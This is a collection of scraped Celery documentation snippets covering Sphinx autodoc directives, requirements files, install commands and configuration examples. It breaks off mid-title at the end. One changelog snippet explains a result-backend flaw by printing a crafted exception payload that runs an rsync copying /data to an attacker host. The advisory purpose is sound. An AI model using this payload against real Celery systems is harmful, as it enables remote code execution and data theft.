Celery\nDESCRIPTION: Default format string for logging messages within tasks. Includes timestamp, log level, process name, task name, task ID and message.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_52\n\nLANGUAGE: text\nCODE:\n```\n[%(asctime)s: %(levelname)s/%(processName)s]\n    %(task_name)s[%(task_id)s]: %(message)s\n```\n\n----------------------------------------\n\nTITLE: Google Pub/Sub Broker URL Format in Celery\nDESCRIPTION: The format for specifying a Google Pub/Sub broker URL in Celery configuration. The URL must include the project ID prefixed with 'projects/'.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/gcpubsub.rst#2025-04-23_snippet_1\n\nLANGUAGE: text\nCODE:\n```\ngcpubsub://projects/project-id\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Autodoc for celery.result Module\nDESCRIPTION: This reStructuredText snippet uses Sphinx directives to configure the automatic documentation generation for the `celery.result` module. The `.. contents:: :local:` directive generates a local table of contents. `.. currentmodule:: celery.result` sets the default module for subsequent directives. `.. automodule:: celery.result :members: :undoc-members:` instructs Sphinx to import the `celery.result` module and document all its members, including those without docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.result.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.result\n\n.. automodule:: celery.result\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Documentation for celery.app.routes module\nDESCRIPTION: ReStructuredText documentation structure for the celery.app.routes module. It includes directives for table of contents, setting the current module, and automatically documenting module members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.app.routes.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=================================\n ``celery.app.routes``\n=================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.app.routes\n\n.. automodule:: celery.app.routes\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Celery Versions in Markdown Table\nDESCRIPTION: A markdown table showing which versions of Celery are currently supported for security updates. It uses checkmarks and X marks to indicate support status.\nSOURCE: https://github.com/celery/celery/blob/main/SECURITY.md#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| Version | Supported          |\n| ------- | ------------------ |\n| 5.4.x   | :white_check_mark: |\n| 5.3.x   | :x: |\n| 5.2.x   | :x:                |\n| 5.1.x   | :x: |\n| < 5.0   | :x:                |\n```\n\n----------------------------------------\n\nTITLE: Running Specific Celery Unit Tests (Console)\nDESCRIPTION: Illustrates how to run a specific test module within the Celery test suite using `nosetests`. This example targets the `celery.tests.test_task` module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_16\n\nLANGUAGE: console\nCODE:\n```\n$ nosetests celery.tests.test_task\n```\n\n----------------------------------------\n\nTITLE: Installing RabbitMQ on macOS using Homebrew\nDESCRIPTION: Command to install RabbitMQ on macOS using the Homebrew package manager.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ brew install rabbitmq\n```\n\n----------------------------------------\n\nTITLE: Setting CELERY_AMQP_TASK_RESULT_EXPIRES in Python\nDESCRIPTION: Example configuration for setting the expiration time for AMQP task results. Shows how to configure the expiry time in both minutes and milliseconds.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nCELERY_AMQP_TASK_RESULT_EXPIRES = 30 * 60  # 30 minutes.\nCELERY_AMQP_TASK_RESULT_EXPIRES = 0.80     # 800 ms.\n```\n\n----------------------------------------\n\nTITLE: Defining Pytest-Based Development and Testing Requirements - Requirements File - Python\nDESCRIPTION: This snippet is a requirements file listing dependencies for testing and development in a Python project. It integrates pytest, its plugins, boto3, moto, mypy for type checking, and pre-commit hooks, with comments and environment markers to manage compatibility. Expected input is for pip to process the file and install the necessary dependencies, while outputs are an appropriately configured Python environment ready for running Celery's test suite; external files referenced via -r must also be available. The file should be used as input to tools like pip or tox, and constraints are managed via version specifiers and environment markers.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/test.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\npytest==8.3.5\npytest-celery[all]>=1.2.0,<1.3.0\npytest-rerunfailures>=14.0,<15.0; python_version >= \"3.8\" and python_version < \"3.9\"\npytest-rerunfailures>=15.0; python_version >= \"3.9\" and python_version < \"4.0\"\npytest-subtests<0.14.0; python_version < \"3.9\"\npytest-subtests>=0.14.1; python_version >= \"3.9\"\npytest-timeout==2.3.1\npytest-click==1.1.0\npytest-order==1.3.0\nboto3>=1.26.143\nmoto>=4.1.11,<5.1.0\n# typing extensions\nmypy==1.14.1; platform_python_implementation==\"CPython\"\npre-commit>=3.5.0,<3.8.0; python_version < '3.9'\npre-commit>=4.0.1; python_version >= '3.9'\n-r extras/yaml.txt\n-r extras/msgpack.txt\n-r extras/mongodb.txt\n-r extras/gcs.txt\n-r extras/pydantic.txt\n```\n\n----------------------------------------\n\nTITLE: Specifying Google Cloud Dependencies in Python Requirements File\nDESCRIPTION: Lists required Python packages for Google Cloud Storage (minimum version 2.10.0), Firestore (exactly 2.20.1), and grpcio (exactly 1.67.0). This requirements specification enables automated environment installs with pip. Intended for use as a requirements.txt file in Python projects needing Google Cloud APIs; no parameters required—simply use it with pip install -r requirements.txt. Input is a text file of dependency specs, output is a pip-resolved environment; only supports compatible package versions and may require Python 3.x.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/gcs.txt#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\ngoogle-cloud-storage>=2.10.0\\ngoogle-cloud-firestore==2.20.1\\ngrpcio==1.67.0\n```\n\n----------------------------------------\n\nTITLE: Auto-Documenting Python Module Members with Sphinx RST\nDESCRIPTION: This reStructuredText snippet uses the Sphinx `automodule` directive to automatically pull documentation from the specified Python module (`celery.worker.consumer.tasks`). The `:members:` option instructs Sphinx to document all public members (functions, classes, variables) within the module, and `:undoc-members:` includes members even if they lack docstrings. This requires the `sphinx.ext.autodoc` extension.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.consumer.tasks.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.worker.consumer.tasks\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Migrating from celery.task import Task to celery import Task in Python\nDESCRIPTION: Shows how to update imports when the celery.task module is removed in version 5.0. Users need to change imports to use the Task class from the main celery package.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/deprecation.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.task import Task\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Task\n```\n\n----------------------------------------\n\nTITLE: Sphinx Autodoc Configuration for celery.events\nDESCRIPTION: This snippet uses Sphinx reStructuredText directives to configure automatic documentation generation. `.. contents:: :local:` creates a local table of contents. `.. currentmodule:: celery.events` sets the default module context. `.. automodule:: celery.events :members: :undoc-members:` instructs Sphinx to pull documentation from the specified Python module (`celery.events`), including all members and those without explicit docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.events.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.events\n\n.. automodule:: celery.events\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Defining Celery Internals Documentation Structure with reStructuredText\nDESCRIPTION: This code defines the structure of the Celery internals documentation using reStructuredText format. It includes metadata like release version and date, and organizes documentation sections into a table of contents.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. _internals:\n\n===========\n Internals\n===========\n\n:Release: |version|\n:Date: |today|\n\n.. toctree::\n    :maxdepth: 2\n\n    guide\n    deprecation\n    worker\n    protocol\n    app-overview\n    reference/index\n```\n\n----------------------------------------\n\nTITLE: Removing Celery Platform Module Files in Console\nDESCRIPTION: Command to remove the old celery.platform module files after identifying their location, to resolve conflicts with the renamed celery.platforms module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ rm -f /opt/devel/celery/celery/platform.py*\n```\n\n----------------------------------------\n\nTITLE: Specifying Documentation and Test Dependencies - Requirements File - Plain Text\nDESCRIPTION: This snippet is a Python requirements file for managing dependencies related to documentation and testing in the Celery project. It lists required packages such as sphinx_celery (>=2.1.1), Sphinx (>=7.0.0), sphinx-testing (~=1.0.1), and sphinx-click (==6.0.0). The '-r' directives include additional requirement files that define optional or extra dependencies for SQLAlchemy integration, authentication, sphinx-autobuild, testing, and mocking. The file is intended to be used with pip or other Python dependency managers to create a repeatable environment for building Celery's documentation and running tests. Inputs are processed line-by-line by pip, and the expected output is a fully populated Python environment; limitations include being dependent on the package versions available in PyPI and the referenced files.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/docs.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nsphinx_celery>=2.1.1\nSphinx>=7.0.0\nsphinx-testing~=1.0.1\nsphinx-click==6.0.0\n-r extras/sqlalchemy.txt\n-r test.txt\n-r deps/mock.txt\n-r extras/auth.txt\n-r extras/sphinxautobuild.txt\n```\n\n----------------------------------------\n\nTITLE: Enabling Persistent Revokes in Console\nDESCRIPTION: Command line example showing how to enable persistent revokes using the statedb option.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd --statedb=/var/run/celeryd\n```\n\n----------------------------------------\n\nTITLE: Implementing App-Dependent Classes in Celery\nDESCRIPTION: Shows how to create app-dependent classes that can work with or without an explicit app instance, using the app_or_default function.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.app import app_or_default\n\nclass SomeClass:\n\n    def __init__(self, app=None):\n        self.app = app_or_default(app)\n```\n\n----------------------------------------\n\nTITLE: Generating Local Table of Contents with Sphinx\nDESCRIPTION: This Sphinx directive generates a table of contents specific to the current file ('local'). It lists the sections defined within this documentation page.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.request.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. contents::\n    :local:\n```\n\n----------------------------------------\n\nTITLE: Declaring python-memcached Dependency Requirement\nDESCRIPTION: This line specifies a dependency on the `python-memcached` library. It mandates that the installed version must be 1.61 or greater. This format is commonly used in Python project requirement files (e.g., requirements.txt) to manage dependencies using tools like pip.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/pymemcache.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\npython-memcached>=1.61\n```\n\n----------------------------------------\n\nTITLE: Defining `sphinx-autobuild` Version Constraint in Pip\nDESCRIPTION: This line specifies the required version constraints for the `sphinx-autobuild` Python package using the pip requirement format. It mandates installing a version greater than or equal to `2021.3.14` while strictly excluding version `2024.9.3`. This is commonly found in `requirements.txt` files to manage project dependencies.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/sphinxautobuild.txt#2025-04-23_snippet_0\n\nLANGUAGE: pip\nCODE:\n```\nsphinx-autobuild>=2021.3.14,!=2024.9.3\n```\n\n----------------------------------------\n\nTITLE: Executing Custom Inspect Command via CLI\nDESCRIPTION: Command line example showing how to execute a custom inspect command using celery inspect utility.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_46\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect current_prefetch_count\n```\n\n----------------------------------------\n\nTITLE: Defining Django Model for Blog Comments\nDESCRIPTION: This snippet defines a Django model for blog comments, including fields for spam detection.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_52\n\nLANGUAGE: python\nCODE:\n```\nfrom django.db import models\nfrom django.utils.translation import ugettext_lazy as _\n\n\nclass Comment(models.Model):\n    name = models.CharField(_('name'), max_length=64)\n    email_address = models.EmailField(_('email address'))\n    homepage = models.URLField(_('home page'),\n                               blank=True, verify_exists=False)\n    comment = models.TextField(_('comment'))\n    pub_date = models.DateTimeField(_('Published date'),\n                                    editable=False, auto_add_now=True)\n    is_spam = models.BooleanField(_('spam?'),\n                                  default=False, editable=False)\n\n    class Meta:\n        verbose_name = _('comment')\n        verbose_name_plural = _('comments')\n```\n\n----------------------------------------\n\nTITLE: Defining reStructuredText Substitution for Coverage Badge\nDESCRIPTION: This reStructuredText substitution definition creates a shortcut named 'coverage'. Using '|coverage|' inserts an image directive pointing to the Codecov coverage badge for the Celery project's main branch. The image links to the project's Codecov page.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. |coverage| image:: https://codecov.io/github/celery/celery/coverage.svg?branch=main\n    :target: https://codecov.io/github/celery/celery?branch=main\n```\n\n----------------------------------------\n\nTITLE: Importing Celery Dispatch Signal Module\nDESCRIPTION: This code snippet demonstrates how to import the celery.utils.dispatch.signal module in Python. It's used to set up the current module for documentation generation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.dispatch.signal.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\n.. currentmodule:: celery.utils.dispatch.signal\n```\n\n----------------------------------------\n\nTITLE: Displaying Helm Chart Directory Structure - Markdown\nDESCRIPTION: This markdown code block displays the folder and file hierarchy for the provided Celery Helm chart. It helps users quickly visualize the template and configuration files present in the helm-chart directory, including references to values.yaml, template files (for ConfigMap, deployment, secrets, service account), and documentation. No dependencies required; output is for documentation and navigation purposes only.\nSOURCE: https://github.com/celery/celery/blob/main/helm-chart/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nhelm-chart\n├── Chart.yaml\n├── README.rst\n├── templates\n│   ├── _helpers.tpl\n│   ├── configmap.yaml\n│   ├── deployment.yaml\n│   ├── secret.yaml\n│   └── serviceaccount.yaml\n└── values.yaml\n```\n\n----------------------------------------\n\nTITLE: Generating Celery Dispatch Signal Module Documentation\nDESCRIPTION: This directive is used to automatically generate documentation for the celery.utils.dispatch.signal module, including all members and undocumented members. It's part of the Sphinx documentation system.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.dispatch.signal.rst#2025-04-23_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\n.. automodule:: celery.utils.dispatch.signal\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx\nDESCRIPTION: Uses the Sphinx `.. currentmodule::` directive to set the default Python module context to `celery.bin.call`. This allows subsequent directives like `.. automodule::` or `.. autofunction::` to reference members of this module without needing the full path.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.call.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.bin.call\n```\n\n----------------------------------------\n\nTITLE: Defining Celery Test Dependencies using pip Requirements\nDESCRIPTION: Specifies Python dependencies for Celery testing using the pip requirements file format. It includes multiple other requirement files via the '-r' flag for different features (auth, solar, various backends like MongoDB, Elasticsearch, etc.). It installs the 'kombu' library directly from its GitHub repository and requires 'urllib3' version 1.26.16 or newer, noted as an SQS dependency.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/test-ci-default.txt#2025-04-23_snippet_0\n\nLANGUAGE: pip requirements\nCODE:\n```\n-r test-ci-base.txt\n-r extras/auth.txt\n-r extras/solar.txt\n-r extras/mongodb.txt\n-r extras/yaml.txt\n-r extras/tblib.txt\n-r extras/slmq.txt\n-r extras/msgpack.txt\n-r extras/memcache.txt\n-r extras/eventlet.txt\n-r extras/gevent.txt\n-r extras/thread.txt\n-r extras/elasticsearch.txt\n-r extras/couchdb.txt\n# -r extras/couchbase.txt\n-r extras/arangodb.txt\n-r extras/consul.txt\n-r extras/cosmosdbsql.txt\n-r extras/cassandra.txt\n-r extras/azureblockblob.txt\ngit+https://github.com/celery/kombu.git\n\n# SQS dependencies other than boto\nurllib3>=1.26.16\n```\n\n----------------------------------------\n\nTITLE: Auto-Documenting Python Module with Sphinx\nDESCRIPTION: This Sphinx directive automatically generates documentation for the Python module `celery.worker.request` by introspecting it and extracting docstrings. The `:members:` option includes documentation for all public members (functions, classes, etc.) defined within the module. The `:undoc-members:` option forces inclusion of members even if they lack docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.request.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.worker.request\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Automating Documentation for Celery Exceptions with Sphinx - reStructuredText\nDESCRIPTION: This snippet uses reStructuredText and Sphinx directives to document the celery.exceptions module. It leverages the automodule directive with the :members: and :undoc-members: options to include all public and private members, automatically generating comprehensive API documentation. Intended for developers using Sphinx to document Python code, it requires Sphinx's autodoc extension and a properly configured project. Inputs: a Python module (celery.exceptions); Outputs: structured HTML or other formats showing all exceptions. Limitations: Only works within Sphinx-supported documentation builds.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.exceptions.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n================================\n ``celery.exceptions``\n================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.exceptions\n\n.. automodule:: celery.exceptions\n    :members:\n    :undoc-members:\n\n```\n\n----------------------------------------\n\nTITLE: Specifying pyArango Dependency Version\nDESCRIPTION: This line specifies a requirement for the Python package `pyArango`. It dictates that version 2.0.2 or any subsequent version (`>=`) is needed for the project to function correctly. This is typically found in a requirements file (e.g., `requirements.txt`) used by `pip`.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/extras/arangodb.txt#2025-04-23_snippet_0\n\nLANGUAGE: text\nCODE:\n```\npyArango>=2.0.2\n```\n\n----------------------------------------\n\nTITLE: Configuring reStructuredText Documentation for celery._state Module\nDESCRIPTION: Sets up documentation structure for the celery._state module using reStructuredText directives. Includes a table of contents, sets the current module context, and configures the automodule directive to include all members and undocumented members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery._state.rst#2025-04-23_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n========================================\n ``celery._state``\n========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery._state\n\n.. automodule:: celery._state\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Old Celery Task Class Definition\nDESCRIPTION: Demonstrates how task classes were defined and registered in earlier versions of Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Task\nfrom celery.registry import tasks\n\nclass Hello(Task):\n    queue = 'hipri'\n\n    def run(self, to):\n        return 'hello {0}'.format(to)\ntasks.register(Hello)\n\n>>> Hello.delay('world!')\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Potential Security Vulnerability in Celery's Result Backend\nDESCRIPTION: This code snippet demonstrates a potential security vulnerability in Celery. An attacker could inject a remote code execution instruction by manipulating the task's result with a specially crafted exception in the result backend, potentially executing arbitrary code if certain conditions are met.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n{\n      \"exc_module\": \"os\",\n      'exc_type': \"system\",\n      \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Celery Functional Utilities Module in Python\nDESCRIPTION: This snippet demonstrates how to import the celery.utils.functional module in Python. It is typically used at the beginning of a file to access the functional utilities provided by Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.functional.rst#2025-04-23_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nfrom celery.utils.functional import *\n```\n\n----------------------------------------\n\nTITLE: Structuring Tutorials Documentation Index - reStructuredText\nDESCRIPTION: This snippet defines the structure for the tutorials section of the Celery documentation using reStructuredText. It sets the section title, release and date variables, and establishes a toctree directive with a maximum depth of two, listing subordinate tutorial documents to be included. No external dependencies are required, but rendering with Sphinx or another compatible documentation generator is expected. Inputs are static reStructuredText files; the output is a formatted documentation page with generated navigation, and the snippet assumes referenced documents (like task-cookbook) exist.\nSOURCE: https://github.com/celery/celery/blob/main/docs/tutorials/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n===========\\n Tutorials\\n===========\\n\\n:Release: |version|\\n:Date: |today|\\n\\n.. toctree::\\n    :maxdepth: 2\\n\\n    task-cookbook\n```\n\n----------------------------------------\n\nTITLE: Installing CouchDB Backend Dependencies\nDESCRIPTION: Command to install CouchDB dependencies for Celery\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_37\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[couchdb]\n```\n\n----------------------------------------\n\nTITLE: Identifying the QUIT Signal\nDESCRIPTION: Represents the SIGQUIT signal identifier. This signal typically initiates a soft or cold shutdown in Celery. The `REMAP_SIGTERM` feature allows SIGTERM to mimic this behavior.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_8\n\nLANGUAGE: Identifier\nCODE:\n```\n:sig:`QUIT`\n```\n\n----------------------------------------\n\nTITLE: Vim RST Configuration\nDESCRIPTION: Vim editor configuration for RST files specifying syntax, tab behavior, and spacing settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/includes/resources.txt#2025-04-23_snippet_0\n\nLANGUAGE: vim\nCODE:\n```\n# vim: syntax=rst expandtab tabstop=4 shiftwidth=4 shiftround\n```\n\n----------------------------------------\n\nTITLE: Updating Django INSTALLED_APPS Configuration\nDESCRIPTION: Example showing how to update Django's INSTALLED_APPS setting when migrating to django-celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nINSTALLED_APPS = 'djcelery'\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Gevent Module\nDESCRIPTION: ReStructuredText documentation configuration for the celery.concurrency.gevent module, including table of contents and autodoc directives.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.concurrency.gevent.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n=============================================================\n ``celery.concurrency.gevent``\n=============================================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.concurrency.gevent\n\n.. automodule:: celery.concurrency.gevent\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Upgrading Celery to 2.4.4 using pip or easy_install (Bash)\nDESCRIPTION: Shell commands to upgrade the Celery package to version 2.4.4 using either `pip` or `easy_install`. This is the recommended solution for users on the Celery 2.4 series to patch the CELERYSA-0001 vulnerability. Requires Python package management tools (`pip` or `easy_install`) to be installed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/sec/CELERYSA-0001.txt#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\npip install -U celery\n```\n\nLANGUAGE: bash\nCODE:\n```\neasy_install -U celery\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Base Concurrency Module\nDESCRIPTION: Sphinx documentation structure showing the module contents and configuration for celery.concurrency.base. Uses directives to generate API documentation including all members and undocumented members.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.concurrency.base.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n===============================================\n ``celery.concurrency.base``\n===============================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.concurrency.base\n\n.. automodule:: celery.concurrency.base\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for DynamoDB Backend\nDESCRIPTION: ReStructuredText documentation structure defining the contents and module documentation for Celery's DynamoDB backend. Uses automodule directive to automatically generate documentation from docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.dynamodb.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n===========================================\n ``celery.backends.dynamodb``\n===========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.dynamodb\n\n.. automodule:: celery.backends.dynamodb\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Old Celery Task Definition\nDESCRIPTION: Shows an example of how tasks were defined in early versions of Celery using callable functions and apply_async.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\ndef hello(to):\n    return 'hello {0}'.format(to)\n\n>>> from celery.execute import apply_async\n\n>>> apply_async(hello, ('world!',))\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context in Sphinx\nDESCRIPTION: This Sphinx directive sets the default Python module context for subsequent directives on the page to `celery.worker.request`. This allows referencing classes or functions within this module without specifying the full path.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.request.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.worker.request\n```\n\n----------------------------------------\n\nTITLE: Defining reStructuredText Substitution for Python Version Badge\nDESCRIPTION: This reStructuredText substitution definition sets up a shortcut named 'pyversion'. Using '|pyversion|' displays an image badge (from shields.io based on PyPI data) showing the Python versions supported by Celery. The image links to the Celery project page on PyPI.\nSOURCE: https://github.com/celery/celery/blob/main/docs/templates/readme.txt#2025-04-23_snippet_4\n\nLANGUAGE: rst\nCODE:\n```\n.. |pyversion| image:: https://img.shields.io/pypi/pyversions/celery.svg\n    :alt: Supported Python versions.\n    :target: https://pypi.org/project/celery/\n```\n\n----------------------------------------\n\nTITLE: Setting WSGI Celery Loader\nDESCRIPTION: Configuration example for setting the Celery loader in a WSGI environment.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nimport os\nos.environ['CELERY_LOADER'] = 'django'\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for MongoDB Backend\nDESCRIPTION: ReStructuredText documentation structure defining the layout and module references for the MongoDB backend documentation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.backends.mongodb.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n============================================\n ``celery.backends.mongodb``\n============================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.backends.mongodb\n\n.. automodule:: celery.backends.mongodb\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Google Pub/Sub Configuration in Celery\nDESCRIPTION: Shows how to install and configure Google Cloud Pub/Sub as a message transport in Celery using pip installation and broker URL configuration.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ pip install \"celery[gcpubsub]\"\n```\n\nLANGUAGE: python\nCODE:\n```\nbroker_url = 'gcpubsub://projects/project-id'\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for Celery Thread Utils\nDESCRIPTION: ReStructuredText documentation configuration for the celery.utils.threads module, including table of contents and automodule directives for generating API documentation\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.threads.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n==========================================\n ``celery.utils.threads``\n==========================================\n\n.. contents::\n    :local:\n.. currentmodule:: celery.utils.threads\n\n.. automodule:: celery.utils.threads\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Auto-documenting Python Module with Sphinx\nDESCRIPTION: The `automodule` Sphinx directive instructs Sphinx to automatically pull documentation from the specified Python module (`celery.utils.sysinfo`). The `:members:` option ensures all public members with docstrings are included, and `:undoc-members:` includes members even if they lack docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/reference/celery.utils.sysinfo.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.utils.sysinfo\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Deleting Old RabbitMQ Exchange using camqadm in Shell\nDESCRIPTION: Command to delete the previous 'celeryresults' exchange in RabbitMQ using the camqadm tool. This is necessary for RabbitMQ users upgrading from versions where the exchange had the auto_delete flag set.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ camqadm exchange.delete celeryresults\n```\n\n----------------------------------------\n\nTITLE: Configuring RST Documentation Structure for Django-Celery Integration\nDESCRIPTION: ReStructuredText markup defining the documentation structure for Django integration with Celery. Sets up the document title, release version, date, and includes a table of contents linking to first steps guide.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/index.rst#2025-04-23_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. _django:\\n\\n=========\\n Django\\n=========\\n\\n:Release: |version|\\n:Date: |today|\\n\\n.. toctree::\\n    :maxdepth: 2\\n\\n    first-steps-with-django\n```\n\n----------------------------------------\n\nTITLE: Integrating Celery CLI 